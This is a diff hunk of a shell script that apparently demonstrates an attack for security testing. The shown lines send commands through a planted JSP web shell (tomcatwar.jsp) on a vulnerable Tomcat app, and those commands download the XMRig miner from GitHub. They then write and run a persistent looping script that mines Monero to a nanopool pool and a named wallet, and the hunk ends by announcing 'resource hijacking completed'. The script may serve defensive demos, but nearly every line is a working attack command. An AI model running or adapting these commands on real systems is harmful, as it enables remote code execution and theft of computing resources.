@@ -406,12 +406,13 @@ simulate_command_fake 'curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --d
 curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=wget -O file.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz" -s | grep -a -v request.getParameter | sort | uniq | sed '\~^//~d'
 simulate_command_fake 'curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=tar -xf file.tar.gz" -s' 1 1 1
 curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=tar -xf file.tar.gz" -s | grep -a -v request.getParameter | sort | uniq | sed '\~^//~d'
-curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode 'cmd=echo -e "set -x \n while true; do /xmrig-6.16.4/xmrig --donate-level 100 -o xmr-us-east1.nanopool.org:14433 -k -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero --background ; sleep 20; pkill xmrig; echo restarting_miner; done" > /crypto_run.sh' -s | grep -a -v request.getParameter | sort | uniq | sed '\~^//~d'
+curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode 'cmd=echo -e "set -x \n while true; do /xmrig-6.16.4/xmrig --donate-level 100 -o xmr-us-east1.nanopool.org:14433 -k -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero --background && sleep 20 && pkill xmrig && echo restarting_miner; done" > /crypto_run.sh' -s | grep -a -v request.getParameter | sort | uniq | sed '\~^//~d'
+curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode 'cmd=chmod u+x /crypto_run.sh' -s | grep -a -v request.getParameter | sort | uniq | sed '\~^//~d'
 
 simulate_command_fake 'curl -s --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=setsid /xmrig-6.16.4/xmrig --donate-level 100 -o xmr-us-east1.nanopool.org:14433 -k -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero --background"' 1 1 1
-curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=bash -c '/crypto_run.sh & disown'" -s &
+curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=bash -c 'nohup /crypto_run.sh > output.log 2>&1 & disown'" -s &
 simulate_command_fake 'curl -s --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=ps aux"' 1 1 1
-curl -s --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=ps aux" | grep -a -v request.getParameter
+curl -s --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=ps -ef" | grep -a -v request.getParameter
 
 show_message_box "RESOURCE HIJACKING COMPLETED!" "We just successfully deployed cryptominer on target workload."
 
